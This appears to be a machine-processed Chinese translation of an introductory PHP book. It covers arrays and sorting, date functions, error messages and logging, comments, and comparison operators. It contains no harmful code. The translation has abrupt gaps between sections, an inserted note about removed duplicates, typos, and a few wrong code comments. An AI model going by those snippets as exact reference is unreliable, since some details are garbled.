  ;\n$capitals['TX'] = \"Austin\";\n$capitals['OR'] = \"Salem\";\n```\n\n你可以使用快捷方式，而不是为每个数字编写单独的赋值语句。一种快捷方式使用以下语句：\n\
  \n```php\n$cities[] = \"Phoenix\";\n$cities[] = \"Tucson\";\n$cities[] = \"Flagstaff\"\
  ;\n```\n\n当你使用这种快捷方式创建数组时，值会自动分配从数字 `0` 开始的序列号作为键。例如，以下语句输出 `Phoenix`。\n\n```php\n\
  echo \"$cities[0]\";\n```\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) 除非你特意设置为其他数字，否则带有数字索引的数组中的第一个值是\
  \ `0`。使用数组时一个常见的错误是将第一个数字误认为是 `1` 而不是 `0`。\n\n一个更好的快捷方式是使用以下语句：\n\n```php\n$cities\
  \ = array( \"Phoenix\",\"Tucson\",\"Flagstaff\");\n```\n\n这条语句创建了与前面快捷方式相同的数组，带有数字键。你可以使用类似的语句创建以单词为键的数组。例如，以下语句创建了州首府数组：\n\
  \n```php\n$capitals = array( \"CA\" => \"Sacramento\", \"TX\" => \"Austin\",\n \
  \                 \"OR\" => \"Salem\" );\n```\n\n### 查看数组\n\n你可以像这样输出数组值：\n\n```php\n\
  echo $capitals['TX'];\n```\n\n如果你将数组值包含在由双引号括起来的较长的 `echo` 语句中，你可能需要用花括号将数组值名称括起来：\n\
  \n```php\necho \"The capital of Texas is {$capitals['TX']}<br />\";\n```\n\n你可以通过使用\
  \ `print_r` 或 `var_dump` 来查看任何数组的结构和值。要显示 `$capitals` 数组，请使用以下之一：\n\n```php\nprint_r($capitals);\n\
  var_dump($capitals);\n```\n\n`print_r` 输出如下：\n\n```\nArray\n(\n    [CA] => Sacramento\n\
  \    [TX] => Austin\n    [OR] => Salem\n)\n```\n\n`var_dump` 输出如下：\n\n```\narray(3)\
  \ {\n  [\"CA\"]=>\n  string(10) \"Sacramento\"\n  [\"TX\"]=>\n  string(6) \"Austin\"\
  \n  [\"OR\"]=>\n  string(5) \"Salem\"\n}\n```\n\n`print_r` 输出显示数组中每个元素的键和值。`var_dump`\
  \ 输出显示数据类型以及键和值。\n\n![tip.eps](img/tip_fmt.png) 当你在网页上显示 `print_r` 或 `var_dump`\
  \ 的输出时，它会以 HTML 格式显示，这意味着它会显示在一长行中。为了在网页上以这里描述的有用格式查看输出，请发送 HTML 标签，告诉浏览器按原样显示文本而不做更改，使用以下方式：\n\
  \n```php\necho \"<pre>\";\nprint_r($capitals);\necho \"</pre>\";\n```\n\n### 从数组中删除值\n\
  \n有时你需要完全删除数组中的一个元素。例如，假设你有以下包含五个元素的数组：\n\n```php\n$cities[0] = \"Phoenix\";\n$cities[1]\
  \ = \"Tucson\";\n$cities[2] = \"Flagstaff\";\n$cities[3] = \"Tempe\";\n$cities[4]\
  \ = \"Prescott\";\n```\n\n现在你决定不再需要 Tempe，因此你使用以下语句尝试从数组中删除 `Tempe`：\n\n```php\n\
  $cities[3] = \"\";\n```\n\n虽然这条语句将 `$cities[3]` 设置为空字符串，但它并没有从数组中删除该元素。你仍然有一个包含五个元素的数组，但其中一个值是空的。要完全从数组中删除该元素，你需要使用以下语句取消设置它：\n\
  \n```php\nunset($cities[3]);\n```\n\n现在你的数组只有四个元素，如下所示：\n\n```php\n$cities[0] =\
  \ \"Phoenix\";\n$cities[1] = \"Tucson\";\n$cities[2] = \"Flagstaff\";\n$cities[4]\
  \ = \"Prescott\";\n```\n\n## 排序数组\n\n\n\n\n数组最用的功能之一是 PHP 可以为你对它们进行排序。PHP 初始按照你创建元素的顺序来存储数组元素。如果你在不改变顺序的情况下显示整个数组，元素将按照你创建的顺序显示。通常，你想要改变这种顺序。例如，你可能想按值或键的字母顺序显示数组。\n\
  \n## 数组排序\n\nPHP 有多种方式对数组进行排序。要对以数字作为键的数组进行排序，使用 `sort` 函数，如下：\n\n```php\nsort($cities);\n\
  ```\n\n此语句按值进行排序，并分配合适的数字作为新键。值的排序顺序是数字在前，大写字母在后，最后是小写字母。例如，考虑在前节中创建的 `$cities`\
  \ 数组：\n\n```php\n$cities[0] = \"Phoenix\";\n$cities[1] = \"Tucson\";\n$cities[2]\
  \ = \"Flagstaff\";\n```\n\n执行以下 `sort` 语句后\n\n```php\nsort($cities);\n```\n\n数组变为：\n\
  \n```php\n$cities[0] = \"Flagstaff\";\n$cities[1] = \"Phoenix\";\n$cities[2] = \"\
  Tucson\";\n```\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) 如果你使用 `sort()` 对以单词作为键的数组进行排序，键将变为数字，单词键将被丢弃。\n\
  \n要对以单词作为键的数组进行排序，使用 `asort` 函数。此语句按值对首府进行排序，并为每个值保留原始键。例如，考虑在前节中创建的州府数组：\n\n```php\n\
  $capitals['CA'] = \"Sacramento\";\n$capitals['TX'] = \"Austin\";\n$capitals['OR']\
  \ = \"Salem\";\n```\n\n执行以下 `asort` 语句后\n\n```php\nasort($capitals);\n```\n\n数组变为：\n\
  \n```php\n$capitals['TX'] = \"Austin\";\n$capitals['CA'] = \"Sacramento\";\n$capitals['OR']\
  \ = \"Salem\";\n```\n\n注意，当元素重新排序时，键与值保持关联。现在元素按字母顺序排列，正确的州键仍然对应相应的州府。如果键是数字，这些数字现在将处于不同的顺序。你可能不想对以数字作为键的数组使用\
  \ `asort`。\n\n其他几个 `sort` 语句以其他方式进行排序。表 1-5 列出了所有可用的 `sort` 语句。\n\n### 表 1-5 排序数组的方法\n\
  \n| 排序语句 | 功能描述 |\n| :--- | :--- |\n| `sort($arrayname)` | 按值排序；分配新的数字作为键。 |\n|\
  \ `asort($arrayname)` | 按值排序；保留相同的键。 |\n| `rsort($arrayname)` | 按值反序排序；分配新的数字作为键。\
  \ |\n| `arsort($arrayname)` | 按值反序排序；保留相同的键。 |\n| `ksort($arrayname)` | 按键排序。 |\n\
  | `krsort($arrayname)` | 按键反序排序。 |\n| `usort($arrayname, functionname)` | 通过函数进行排序。（参见下一章。）\
  \ |\n\n## 从数组中获取值\n\n你可以通过直接访问来获取数组中的任何单独值，如下：\n\n```php\n$CAcapital = $capitals['CA'];\n\
  echo $CAcapital ;\n```\n\n这些语句的输出是\n\n`Sacramento`\n\n如果你使用了不存在的数组元素，会显示一个通知（在在本章稍后的部分\
  \ 理解 PHP 错误消息 中阅读通知）。例如，假设你使用了以下语句：\n\n```php\n$CAcapital = $capitals['CAx'];\n\
  ```\n\n如果数组 `$capitals` 存在但没有键为 `CAx` 的元素，你会看到通知：\n\n`Notice: Undefined index: CAx\
  \ in d:\\testarray.php on line 9`\n\n通知不会导致脚本停止。通知后的语句将继续执行。但由于没有给 `$CAcapital`\
  \ 赋值，任何后续的 `echo` 语句都将输出空格。你可以使用 `@` 符号来防止显示通知：\n\n```php\n@$CAcapital = $capitals['CAx'];\n\
  ```\n\n你可以使用 `list` 语句一次从数组中获取多个值，或使用 `extract` 语句获取数组中的所有值。\n\n`list` 函数从数组中获取值并将其放入变量。以下语句包含一个\
  \ `list` 语句：\n\n```php\n$flowerInfo = array (\"Rose\", \"red\", 12.00);\nlist($firstvalue,$secondvalue)\
  \ = $flowerInfo;\necho $firstvalue,\"<br />\";\necho $secondvalue,\"<br />\";\n\
  ```\n\n第一行创建 `$flowerInfo` 数组。第三行设置了两个名为 `$firstvalue` 和 `$secondvalue` 的变量，并将 `$flowerInfo`\
  \ 中的两个值复制到这两个新变量中，就像你使用了以下两个语句一样\n\n```php\n$firstvalue=$flowerInfo[0];\n$secondvalue=$flowerInfo[1];\n\
  ```\n\n*(注：原文中后续存在大量重复段落，已根据要求进行去重处理)*\n\n\n\n\n这种方法赋予了你灵活性。你可以以任何方式遍历数组——而不只是一次处理一个值。你可以向后移动、直接跳到末尾、通过连续使用两个\
  \ `next` 语句来跳过每一个值，或者任何你认为有用的方法。然而，如果你想从头到尾一次处理一个值地遍历数组，PHP 提供了 `foreach`，它能更高效地完成你的需求。`foreach`\
  \ 将下一节中介绍。\n\n### 使用 foreach 遍历数组\n\n`foreach` 语句每次遍历数组的一个值。在每次执行语句块时，数组的当前键和值都可以在语句块中使用。其通用格式如下：\n\
  \n```php\nforeach( $arrayname as $keyname => $valuename )\n{\n    block of statements;\n\
  }\n```\n\n填入以下信息：\n\n![check](img/check.png) `arrayname`：你正在遍历的数组名称。\n\n![check](img/check.png)\
  \ `keyname`：你想要存储键的变量名称。`keyname` 是可选的。如果你省略了 `$keyname =>`，则仅会将值放入可以在语句块中使用的变量中。\n\
  \n![check](img/check.png) `valuename`：你想要存储值的变量名称。\n\n例如，以下 `foreach` 语句遍历了州首的示例数组并输出了列表：\n\
  \n```php\n$capitals = array(\"CA\" => \"Sacramento\", \"TX\" => \"Austin\",\n  \
  \              \"OR\" => \"Salem\" );\nksort($capitals);\nforeach( $capitals as\
  \ $state => $city )\n{\n    echo \"$city, $state<br />\";\n}\n```\n\n前面的语句会产生以下网页输出：\n\
  \n`Sacramento, CA`\n`Salem, OR`\n`Austin, TX`\n\n你可以使用以下行替换前面语句中的 `foreach` 行：\n\
  \n```php\nforeach( $capitals as $city )\n```\n\n当使用这个 `foreach` 语句时，只有城市名称可以输出。你将需要使用以下\
  \ `echo` 语句：\n\n```php\necho \"$city<br />\";\n```\n\n更改后的输出为：\n\n`Sacramento`\n\
  `Salem`\n`Austin`\n\n当 `foreach` 开始遍历数组时，它会将指针移动到数组的开头。在使用 `foreach` 遍历数组之前，你不需要重置数组。\n\
  \n### 使用多维数组存储值\n\n在本章之前的章节中，我们描述了单一键/值对列表的数组。然而，在某些情况下，你可能希望通过多个键来存储值。例如，假设你想按照州和县存储城市，如下所示：\n\
  \n```php\n$cities['AZ']['Maricopa'] = Phoenix;\n$cities['AZ']['Cochise'] = Tombstone;\n\
  $cities['AZ']['Yuma'] = Yuma;\n$cities['OR']['Multnomah'] = Portland;\n$cities['OR']['Tillamook']\
  \ = Tillamook;\n$cities['OR']['Wallowa'] = Joseph;\n```\n\n这种数组被称为多维数组，因为它就像一个数组数组，其结构如下：\n\
  \n```\n$cities      key          value\n                            key        \
  \  value\n            AZ          Maricopa    Phoenix\n                        \
  \    Cochise     Tombstone\n                            Yuma        Yuma\n     \
  \       OR          Multnomah    Portland\n                            Tillamook\n\
  ```\n\n\n\n\n\n`$timestamp` 是一个存储了时间戳的变量。此代码假设你之前已经将时间戳存储在变量中，你可能使用某个 PHP 函数来实现（我们将在本节稍后的部分进行描述）。如果没有包含\
  \ `$timestamp`，则将从操作系统获取并使用当前时间。因此，你可以通过以下方式获取日期：\n\n```php\n$today = date(\"Y/m/d\"\
  );\n```\n\n如果今天是 2013 年 8 月 10 日，语句将返回：\n\n```\n2013/08/10\n```\n\n该格式是一个字符串，指定了你想存储在变量中的日期格式。例如，格式\
  \ `\"y-m-d\"` 返回 `13-08-10`，而 `\"M.d.Y\"` 返回 `Aug.10.2013`。表 1-6 列出了你可以在格式字符串中使用的一些符号。（要查看完整的符号列表，请参阅\
  \ [`www.php.net/manual/en/function.date.php`](http://www.php.net/manual/en/function.date.php)\
  \ 中的文档。）日期部分可以使用连字符（`-`）、点（`.`）、正斜杠（`/`）或空格分隔。\n\n### 表 1-6 日期格式符号\n\n| 符号 | 含义\
  \ | 示例 |\n| :--- | :--- | :--- |\n| `F` | 文本形式月份，不缩写 | January |\n| `M` | 文本形式月份，缩写\
  \ | Jan |\n| `m` | 带前零的数字月份 | 02, 12 |\n| `n` | 不带前零的数字月份 | 1, 12 |\n| `d` | 月中的几；带前零的两位数字\
  \ | 01, 14 |\n| `j` | 不带前零的月中的几 | 3, 30 |\n| `l` | 文本形式的星期，不缩写 | Friday |\n| `D`\
  \ | 文本形式的星期，缩写 | Fri |\n| `w` | 数字形式的星期 | 从 0（星期日）到 6（星期六） |\n| `Y` | 四位年份 | 2014\
  \ |\n| `y` | 两位年份 | 02 |\n| `g` | 0 到 12 之间的小时，不带前零 | 2, 10 |\n| `G` | 0 到 24 之间的小时，不带前零\
  \ | 2, 15 |\n| `h` | 0 到 12 之间的小时，带前零 | 01, 10 |\n| `H` | 0 到 24 之间的小时，带前零 | 00,\
  \ 23 |\n| `i` | 分钟 | 00, 59 |\n| `s` | 秒 | 00, 59 |\n| `a` | 小写的 am 或 pm | am, pm\
  \ |\n| `A` | 大写的 AM 或 PM | AM, PM |\n\n### 在变量中存储时间戳\n\n你可以使用以下语句将一个带有当前日期和时间的戳戳赋值给变量：\n\
  \n```php\n$today = time();\n```\n\n另一种存储当前时间戳的方法是使用语句：\n\n```php\n$today = strtotime(\"\
  today\");\n```\n\n你可以通过使用 `strtotime` 并配合各种类似于英语的关键词和缩写来存储特定的时间戳。例如，你可以如下所示为 2014\
  \ 年 1 月 15 日创建一个时间戳：\n\n```php\n$importantDate = strtotime(\"January 15 2014\");\n\
  ```\n\n`strtotime` 语句识别以下单词和缩写：\n\n- ![check](img/check.png) 月份名称：十二个月份名称及缩写\n-\
  \ ![check](img/check.png) 星期：七天及一些缩写\n- ![check](img/check.png) 时间单位：`year`、`month`、`fortnight`、`week`、`day`、`hour`、`minute`、`second`、`am`、`pm`\n\
  - ![check](img/check.png) 一些常用的英语单词：`ago`、`now`、`last`、`next`、`this`、`tomorrow`、`yesterday`\n\
  - ![check](img/check.png) 加减号：`+` 或 `-`\n- ![check](img/check.png) 所有数字\n- ![check](img/check.png)\
  \ 时区：例如 `gmt`（格林威治标准时间）、`pdt`（太平洋夏令时间）和 `akst`（阿拉斯加标准时间）\n\n你可以有很多方式组合这些单词和缩写。以下语句都是有效的：\n\
  \n```php\n$importantDate = strtotime(\"tomorrow\"); # 现在起 24 小小时后\n$importantDate\
  \ = strtotime(\"now + 24 hours\");\n$importantDate = strtotime(\"last saturday\"\
  );\n$importantDate = strtotime(\"8pm + 3 days\");\n$importantDate = strtotime(\"\
  2 weeks ago\"); # 当前时间\n$importantDate = strtotime(\"next year gmt\");\n$importantDate\
  \ = strtotime(\"this 4am\");    # 今天凌晨 4 点\n```\n\n如果你想知道 `$importantDate` 是多久以前的，可以从\
  \ `$today` 中减去它。例如：\n\n```php\n$timeSpan = $today - $importantDate;\n```\n\n这会给你重要日期和今天之间的秒数。或者使用语句：\n\
  \n```php\n$timeSpan = $today - $importantDate\n```\n\n### 理解错误消息\n\n当出现问题时，PHP 会尝试提供帮助。它提供了错误类型以及发生错误的文件和行号。\n\
  \n#### 理解解析错误（parse errors）\n\nPHP 在运行脚本之前会扫描脚本以检查语法错误。当它遇到错误时，会显示解析错误。解析错误是一种致命错误，会导致脚本无法启动。解析错误看起来如下：\n\
  \n```\nParse error: in c:\\test.php on line 6\n```\n\n通常你收到这种错误消息是因为忘记了分号、括号或大括号。显示的错误提供了尽可能的信息。例如，可能会显示：\n\
  \n```\nParse error: parse error, unexpected T_ECHO, expecting ',' or ';', in c:\\\
  test.php on line 6\n```\n\n`T_ECHO` 是一个令牌。令牌代表 PHP 语言的不同部分。某些如 `T_ECHO` 或 `T_IF`\
  \ 非常直观。其他的则比较晦涩。请参阅 PHP 在线文档附录（[`www.php.net/manual/en/tokens.php`](http://www.php.net/manual/en/tokens.php)）中的解析器令牌列表以获取其含义。\n\
  \n#### 理解致命错误（fatal errors）\n\n当 PHP 在脚本执行期间遇到阻止脚本继续执行的严重错误时，会显示致命错误消息。脚本停止运行并显示尽可能的信息以帮助你识别问题。\n\
  \n一个产生致命错误消息的问题是调用不存在的函数。（函数在本书的 第 2 章 中介绍。）如果你在 PHP 脚本中拼写错了函数名，你会看到类似下方的致命错误消息：\n\
  \n```\nFatal error: Call to undefined function xxx() in C:\\Program Files\\Apache\
  \ Group\\Apache2\\htdocs\\PHPandMySQL\\info.php on line 10\n```\n\n\n\n\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 我们使用术语“致命错误”来区分这类错误与其他错误。然而，PHP 只是（令人困惑地）将它们称为错误。你在手册中找不到“致命错误”这个术语。此外，显示这类错误所需的关键字是\
  \ `E_ERROR`。（我们将在本章后面的显示选定的消息一节中介绍这一点。）\n\n# 理解警告\n\n当脚本遇到问题，但问题严重程度不足以阻止脚本运行时，会显示警告消息。警告消息并不意味着脚本无法运行；脚本确实会继续运行。相反，警告消息告诉你\
  \ PHP 认为可能存在问题。你应该找出警告的来源，然后决定是否需要修复它。通常需要修复。\n\n如果你尝试使用无效的用户名或密码连接到 MySQL 数据库，你会看到以下警告消息：\n\
  \n```\n`Warning:` `mysql_connect() [function.mysql-connect]: Access denied for user\
  \ 'root'@'localhost' (using password: YES) in` `C:\\Program Files\\Apache Group\\\
  Apache2\\htdocs\\test.php` `on line` `9`\n```\n\n尝试连接数据库失败，但脚本不会停止运行。它会继续执行脚本中的其他\
  \ PHP 语句。然而，由于后面的语句可能依赖于已建立的数据库连接，因此后面的语句将无法正确执行。这条语句需要修正。大多数产生警告消息的语句都需要修复。\n\n\
  # 理解通知\n\n当 PHP 遇到一个可能是错误也可能完全正常的情况时，会显示通知。通知与警告一样，不会导致脚本停止运行。通知比警告更不可能表示严重问题。通知只是告诉你正在做一些不寻常的事情，并让你重新审视自己的操作，以确保你真的想这样做。\n\
  \n收到通知的一个常见原因是你在输出不存在的变量。以下是这种情况下可能看到的内容示例：\n\n```\n`Notice`:Undefined variable:\
  \ age in` `testing.php` `on line` `9`\n```\n\n# 理解严格消息\n\n严格消息警告编码标准。它们指出那些编码实践不佳或已被更好代码取代的语言特性。严格错误类型是在\
  \ PHP 5 中引入的。严格消息不会停止脚本的执行。然而，修改代码使其不显示任何严格消息，可以使脚本在未来更加可靠。严格消息所强调的某些语言特性可能会在未来被完全移除。\n\
  \n![tip.eps](img/tip_fmt.png) 一些严格消息涉及已被弃用的 PHP 语言特性。弃用函数是已被新函数取代的旧函数。弃用函数仍然受支持，但将在未来被移除。PHP\
  \ 可能会添加一个单独的错误类型 `E_DEPRECATED` 来标识这些类型的错误，这样 `E_STRICT` 和 `E_DEPRECATED` 消息将分别标识不同类型的问题。\n\
  \n# 显示错误消息\n\n你可以通过以下任何一种方式处理错误消息：\n\n![check](img/check.png) 在网页上显示部分或全部错误消息。\n\
  \n![check](img/check.png) 不显示任何错误消息。\n\n![check](img/check.png) 抑制单个错误消息。\n\n你可以通过\
  \ `php.ini` 文件中的设置或脚本中的 PHP 语句来告诉 PHP 是否显示错误消息，或者显示哪些错误消息。`php.ini` 中的设置为所有脚本设置错误处理。脚本中的语句仅为该脚本设置错误处理。\n\
  \n## 关闭错误消息\n\n默认情况下，错误消息会显示在网页上。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 在网页上显示错误消息存在安全风险。\n\n你可以在开发网站时开启错误消息，以便修复错误，但当网页完成并准备向公众展示时，你应该关闭错误消息。\n\n你可以在\
  \ `php.ini` 文件中关闭网站所有脚本的错误消息。找到以下设置：\n\n```\n`display_errors = On`\n```\n\n将 `On`\
  \ 改为 `Off`。\n\n你可以通过以下语句关闭单个脚本中的错误：\n\n```\n`ini_set(\"display_errors\",\"off\"\
  );`\n```\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) 更改设置并不会以任何方式改变错误本身；它只改变错误消息是否显示。致命错误仍然会停止脚本；只是不会在网页上显示消息。\n\
  \n处理错误消息的一种方法是在 `php.ini` 中关闭它们，然后在开发过程中在每个单独的脚本中开启它们。然后，当网站准备向公众展示时，你可以移除开启错误消息的\
  \ `ini_set` 语句。\n\n## 显示选定的消息\n\n你可以通过 `php.ini` 中的以下设置指定要显示的错误消息类型：\n\n```\n`error_reporting\
  \ ==`\n```\n\n你可以使用几种代码之一来告诉 PHP 显示哪些消息。一些可能的设置如下：\n\n```\n`error_reporting = E_ALL\
  \ | E_STRICT`\n```\n\n```\n`error_reporting = 0`\n```\n\n```\n`error_reporting =\
  \ E_ALL & ~ E_NOTICE`\n```\n\n第一个设置显示 `E_ALL`，即除严格消息外的所有错误、警告和通知；以及 `E_STRICT`，即显示严格消息。第二个设置不显示任何错误消息。第三个设置显示除严格消息和通知外的所有错误消息，因为\
  \ `& ~` 表示“且不”。\n\n你可以使用的其他代码包括 `E_WARNING`，表示所有警告；以及 `E_ERROR`，表示所有致命运行时错误。\n\n\
  你也可以为单个脚本设置要显示的消息类型。你可以向脚本中添加一条语句，仅设置该脚本的错误报告级别。在脚本开头添加以下语句：\n\n```\n`error_reporting(\"\
  errorSetting\");`\n```\n\n例如，要查看除严格消息外的所有错误，请使用以下语句：\n\n```\n`error_reporting(E_ALL);`\n\
  ```\n\n## 抑制单个错误消息\n\n你可以停止 PHP 语句中单个错误消息的显示。通常，这不是一个好主意。你应该查看错误消息并修复问题。然而，偶尔抑制单个通知是防止网页上显示不美观消息的最简单方法。\n\
  \n你可以通过在预期生成错误消息的位置放置一个 at 符号（`@`）来停止错误消息的显示。例如，以下语句中的 `@` 抑制了错误消息：\n\n```\n`echo\
  \ @$news1;`\n```\n\n如果变量 `$news1` 之前未被设置，此语句将产生以下通知：\n\n```\n`Notice`:Undefined\
  \ variable: news1 in C:\\Program Files\\Apache Group\\Apache2\\htdocs\\PHPandMySQL\\\
  info.php on line 10\n```\n\n然而，变量名前的 `@` 阻止了通知的显示。此功能应谨慎使用，但在少数情况下可能很有用。\n\n# 记录错误消息\n\
  \n你可以将错误消息存储在日志文件中。这会生成错误的永久记录，无论它们是否显示在网页上。记录消息需要两个设置：\n\n![check](img/check.png)\
  \ `log_errors`：将其设置为 `On` 或 `Off`，以将错误发送到日志文件。\n\n![check](img/check.png) `error_log`：指定记录错误的文件名。\n\
  \n## 记录错误\n\n你可以通过 `php.ini` 中的设置告诉 PHP 记录错误。找到以下设置：\n\n```\n`log_errors = Off`\n\
  ```\n\n\n\n\n将设置更改为`On`。保存修改后的`php.ini`文件并重启 Web 服务器后，PHP 会将错误记录到文本文件中。你可以通过下一节介绍的`error_log`设置来指定\
  \ PHP 将错误发送到何处。如果未通过`error_log`设置指定文件，错误消息将写入 Apache 错误日志，该日志位于 Apache 安装目录下的`logs`子目录中。错误日志的文件扩展名为`.err`。\n\
  \n你可以通过在脚本开头包含以下语句来记录单个脚本的错误：\n\n```\nini_set(\"log_errors\",\"On\");\n```\n\n此语句仅为此脚本设置错误日志记录。\n\
  \n### 指定日志文件\n\n通过`php.ini`中的设置来指定 PHP 记录错误消息的文件。找到以下设置：\n\n```\n;error_log = filename\n\
  ```\n\n删除行首的分号。将`filename`替换为你希望 PHP 记录错误消息的文件的路径和文件名，例如：\n\n```\nerror_log = \"\
  c:\\php\\logs\\errs.log\"\n```\n\n你指定的文件不需要存在。如果不存在，PHP 会创建它。\n\n保存编辑后的`php.ini`文件并重启\
  \ Web 服务器后，错误消息将记录到指定的文件中。每条错误消息单独占一行，行首包含日期和时间。\n\n你可以通过在脚本开头包含以下语句来为单个脚本指定日志文件：\n\
  \n```\nini_set(\"error_log\",\" c:\\php\\logs\\errs.log \");\n```\n\n此语句仅为此脚本设置日志文件。\n\
  \n### 为 PHP 脚本添加注释\n\n注释是嵌入在脚本本身中的说明。在脚本中添加描述其目的和功能的注释至关重要。这对于“彩票因素”很重要——也就是说，如果你中了彩票，跑到法国里维埃拉享受奢华生活，其他人将不得不完成这个应用程序。你的继任者需要知道你的脚本应该做什么以及它是如何工作的。实际上，注释对你也有好处。当细节早已被近期项目的思绪埋藏在脑海中时，你可能需要在明年修改这个脚本。\n\
  \n请大量使用注释。PHP 会忽略注释；注释是给人看的。你可以在脚本的任何位置嵌入注释，只要告诉 PHP 它们是注释即可。注释的格式如下：\n\n```\n/*\
  \  注释文本\n更多注释文本  */\n```\n\n注释可以根据需要任意长或任意短。当 PHP 看到表示注释开始的代码（`/*`）时，它会忽略所有内容，直到看到表示注释结束的代码（`*/`）。\n\
  \n每个脚本开头的一种可能的注释格式如下：\n\n```\n/*  name:         catalog.php\n*  description: Script\
  \ that displays descriptions of\n*               products. The descriptions are\
  \ stored\n*               in a database. The product descriptions\n*           \
  \    are selected from the database based on\n*               the category the user\
  \ entered into a form.\n*  written by:  Lola Designer\n*  created:      2/1/13\n\
  *  modified:    3/15/13\n*/\n```\n\n你应该在整个脚本中使用注释来描述脚本的功能。当脚本语句复杂时，注释尤其重要。请频繁使用如下注释：\n\
  \n```\n/* 从数据库中获取信息 */\n```\n\n```\n/* 检查客户是否年满 18 岁 */\n```\n\n```\n/* 将运费添加到订单总额中\
  \ */\n```\n\nPHP 还有一种短注释格式。你可以通过使用井号（`#`）或两个正斜杠（`//`）来指定单行为注释，方式如下：\n\n```\n# 这是注释行\
  \ 1\n// 这是注释行 2\n```\n\n从`#`或`//`到行尾的所有文本都是注释。你也可以在行中间使用`#`或`//`来表示注释的开始。PHP 会忽略从`#`或`//`到行尾的所有内容。这对于注释特定语句很有用，如下例所示：\n\
  \n```\n$average = $orderTotal/$nItems;  // 计算平均价格\n```\n\n有时你想强调一条注释。以下格式使注释非常醒目：\n\
  \n```\n######################################\n##  仔细检查此部分                  ##\n\
  ######################################\n```\n\nPHP 注释不会包含在发送到用户浏览器的 HTML 代码中。用户看不到这些注释。\n\
  \n在脚本中根据需要经常使用注释，使其清晰明了。然而，使用过多注释是一个错误。不要注释每一行或你在脚本中做的每一件事。如果脚本中注释过多，重要的注释可能会在迷宫中丢失。使用注释来标记章节并解释不寻常或复杂的代码——而不是显而易见的代码。\n\
  \n# 第 2 章：构建 PHP 脚本\n\n## 本章内容\n\n- 在代码中设置条件\n- 使用条件语句\n- 构建和使用循环来重复执行语句\n- 使用函数\n\
  - 保持代码整洁有序\n\nPHP 脚本是一系列指令，存放在一个文件中，该文件的扩展名告诉 Web 服务器在文件中查找 PHP 部分。（扩展名通常是`.php`或`.phtml`，但也可以是\
  \ Web 服务器配置期望的任何扩展名。）PHP 从文件顶部开始，按顺序执行遇到的每条指令。\n\n指令（称为语句）可以简单也可以复杂。第 1 章介绍了简单的语句，例如`echo`语句。第\
  \ 1 章是一个仅包含简单语句的简单脚本。然而，构成 Web 应用程序的脚本并不那么简单。它们是动态的，并与用户和数据库交互。因此，脚本需要复杂的语句。复杂语句执行一个或多个语句块。语句块由一组用花括号（`{`和`}`）括起来的简单语句组成。PHP\
  \ 会查找最后一个块的结束花括号。\n\n以下描述了复杂的语句：\n\n- 条件语句：仅在满足特定条件时执行的语句。PHP 的条件语句是`if`和`switch`。\n\
  - 循环：重复执行语句块的语句。四种类型的循环是`foreach`、`for`、`while`和`do..while`。\n- 函数：可以多次重用的语句。许多任务在应用程序的多个部分中执行。PHP\
  \ 允许你通过创建函数来重用语句块。\n\n条件语句和循环根据条件执行语句块。也就是说，如果条件为真，则执行语句块。因此，要使用条件语句和循环，你需要设置条件。\n\
  \n在本章中，你将了解如何使用复杂语句以及如何将它们组织到 PHP 脚本中。\n\n### 设置条件\n\n条件是 PHP 测试或评估以判断其为真或假的表达式。条件在复杂语句中用于确定是否应执行简单语句块。要设置条件，你需要比较值。\n\
  \n- 两个值相等吗？Sally 的姓氏与 Bobby 的姓氏相同吗？或者，Nick 是 15 岁吗？（Nick 的年龄等于 15 吗？）\n- 一个值比另一个值大还是小？Nick\
  \ 比 Bobby 年轻吗？或者，Sally 的房子花费超过一百万美元吗？\n\n\n\n\n\n![check](img/check.png) 字符串是否匹配某种模式？Bobby\
  \ 的名字是否以 S 开头？邮编是否有五个数字字符？\n\n你还可以设置条件，在其中询问两个或更多问题。例如，你可能会问：Nick 是否比 Bobby 大且 Nick\
  \ 是否比 Sally 小？或者你可能会问：今天是星期日且今天是晴天吗？或者你可能会问：今天是星期日还是星期一？\n\n## 比较值\n\n你可以比较数字或字符串以判断它们是否相等、一个是否比另一个大，或者是否不等。你使用比较运算符来比较值。PHP\
  \ 会评估比较并返回 `true` 或 `false`。例如，以下是一个简单的比较：\n\n```php\n$result = $a == $b;\n```\n\
  \n比较运算符 `==` 检查两个值是否相等。如果 `$a` 和 `$b` 相等，则 `$result` 被赋值布尔值 `true`。如果 `$a` 和 `$b`\
  \ 不相等，则 `$result` 被赋值为 `false`。因此，`$a == $b` 是一个真或假的简单条件。\n\nPHP 提供了几种你可以用于比较值的比较运算符。表\
  \ 2-1 显示了这些比较运算符。\n\n### 表 2-1 比较运算符\n\n| 运算符 | 含义 |\n| :--- | :--- |\n| `==` |\
  \ 两个的值相等吗？ |\n| `===` | 两个值的值和数据类型都相等吗？ |\n| `>` | 第一个值是否大于第二个值？ |\n| `>=` | 第一个值是否大于或等于第二个值？\
  \ |\n| `<` | 第一个值是否小于第二个值？ |\n| `<=` | 第一个值是否小于或等于第二个值？ |\n| `!=`, `<>` | 两个值的值不等吗？\
  \ |\n| `!==` | 两个值的值或数据类型都不相等吗？ |\n\n你可以比较数字和字符串。字符串按字母顺序进行比较，所有大写字母都在任何小写字母之前。例如，`SS`\
  \ 在 `Sa` 之前。标点符号也有顺序，可以发现一个字符比另一个字符大。然而，比较逗号和句号没有很大的实际意义。\n\n![technicalstuff.eps](img/technicalstuff_fmt.png)\
  \ 字符串根据其 ASCII 代码进行比较。在 ASCII 字符集中，每个字符都被分配了一个对应于 0 到 127 之间数字的 ASCII 代码。当比较字符串时，根据此代码进行比较。例如，代表逗号的数字是\
  \ 44。句号对应 46。因此，如果比较句号和逗号，句号会被评估为更大。\n\n以下是 PHP 可以测试以确定它们是否为真的的一些有效比较：\n\n![check](img/check.png)\
  \ `$a == $b`\n\n![check](img/check.png) `$age != 21`\n\n![check](img/check.png)\
  \ `$ageNick < $ageBobby`\n\n![check](img/check.png) `$house_price >= 1000000`\n\n\
  ![warning_bomb.eps](img/warning_bomb_fmt.png) 用于询问两个值是否相同的比较运算符由两个等号 (`==`) 组成。最常见的错误之一是使用单等号进行比较。单等号将值放入变量。因此，诸如\
  \ `if ($weather = \"raining\")` 这样的语句会将 `$weather` 设置为 `raining` 而不是检查它是否已经等于 `raining`，并且始终为真。\n\
